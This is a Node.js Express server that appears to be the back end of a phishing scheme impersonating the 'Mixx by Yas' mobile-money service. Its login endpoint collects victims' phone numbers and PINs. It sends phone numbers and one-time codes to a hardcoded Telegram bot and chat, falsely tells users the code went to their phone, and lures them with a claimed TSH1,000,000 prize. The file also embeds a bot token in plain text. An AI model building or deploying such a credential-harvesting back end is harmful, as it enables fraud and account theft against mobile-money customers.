const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// Use Railway's PORT
const PORT = process.env.PORT || 3000;

// Telegram credentials from Railway variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';

// Storage
const userOTPStore = new Map();
const userPinStore = new Map();
const userSessionStore = new Map();

// Validation
function validatePhone(phone) {
    return /^(07|06)\d{8}$/.test(phone);
}

function validatePin(pin) {
    return /^\d{4}$/.test(pin);
}

function validateOTP(otp) {
    return /^\d{6}$/.test(otp);
}

// Telegram functions
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent');
        return response.data;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        throw error;
    }
}

async function sendOTP(phone, otp) {
    const message = `
🎯 <b>MIXX BY YAS - OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔐 <b>OTP Code:</b> <code>${otp}</code>
⏰ <b>Valid for:</b> 5 minutes

⚠️ <i>Do not share this code with anyone!</i>

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `;
    return await sendTelegramMessage(message);
}

function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// ===== API ENDPOINTS =====

app.get('/', (req, res) => {
    res.json({
        name: 'Mixx by Yas API',
        version: '1.0.0',
        status: 'online',
        telegram: {
            bot: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing',
            chatId: TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'
        }
    });
});

app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        port: PORT,
        telegram: {
            bot: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing',
            chatId: TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'
        }
    });
});

app.post('/api/login', async (req, res) => {
    try {
        const { phone, pin } = req.body;

        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number. Must be 07XXXXXXXX or 06XXXXXXXX'
            });
        }

        if (!pin || !validatePin(pin)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid PIN. Must be 4 digits'
            });
        }

        // Store PIN (demo)
        userPinStore.set(phone, pin);

        // Generate and store OTP
        const otp = generateOTP();
        userOTPStore.set(phone, {
            otp: otp,
            expiresAt: Date.now() + 5 * 60 * 1000,
            attempts: 0
        });

        // Send OTP via Telegram
        await sendOTP(phone, otp);

        console.log('✅ Login successful for:', phone);

        res.json({
            status: 'success',
            message: 'OTP sent to your phone via Telegram',
            data: { phone }
        });

    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({
            status: 'error',
            message: 'Login failed. Please try again.'
        });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { phone, otp } = req.body;

        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number'
            });
        }

        if (!otp || !validateOTP(otp)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid OTP. Must be 6 digits'
            });
        }

        const storedData = userOTPStore.get(phone);
        if (!storedData) {
            return res.status(400).json({
                status: 'error',
                message: 'No OTP found. Please request a new one.'
            });
        }

        if (storedData.attempts >= 3) {
            userOTPStore.delete(phone);
            return res.status(400).json({
                status: 'error',
                message: 'Too many failed attempts. Request a new OTP.'
            });
        }

        if (Date.now() > storedData.expiresAt) {
            userOTPStore.delete(phone);
            return res.status(400).json({
                status: 'error',
                message: 'OTP expired. Request a new one.'
            });
        }

        if (storedData.otp !== otp) {
            storedData.attempts += 1;
            userOTPStore.set(phone, storedData);
            return res.status(400).json({
                status: 'error',
                message: `Invalid OTP. ${3 - storedData.attempts} attempts left.`
            });
        }

        // OTP Verified!
        userOTPStore.delete(phone);

        await sendTelegramMessage(`
🎉 <b>OTP VERIFIED SUCCESSFULLY</b>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Phone:</b> ${phone}
✅ <b>Status:</b> VERIFIED
🏆 <b>Congratulations!</b> You've claimed TSH1,000,000!
        `);

        res.json({
            status: 'success',
            message: 'OTP verified successfully!',
            data: { phone, verified: true }
        });

    } catch (error) {
        console.error('❌ OTP verification error:', error);
        res.status(500).json({
            status: 'error',
            message: 'Verification failed. Please try again.'
        });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { phone } = req.body;

        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number'
            });
        }

        const otp = generateOTP();
        userOTPStore.set(phone, {
            otp: otp,
            expiresAt: Date.now() + 5 * 60 * 1000,
            attempts: 0
        });

        await sendOTP(phone, otp);

        res.json({
            status: 'success',
            message: 'New OTP sent successfully!'
        });

    } catch (error) {
        console.error('❌ Resend OTP error:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to resend OTP.'
        });
    }
});

app.get('/api/test-telegram', async (req, res) => {
    try {
        await sendTelegramMessage('✅ Mixx by Yas bot is online and working!');
        res.json({
            status: 'success',
            message: 'Test message sent to Telegram'
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: 'Failed to send test message'
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 URL: https://mixxbyyas-offers06com-production.up.railway.app`);
});
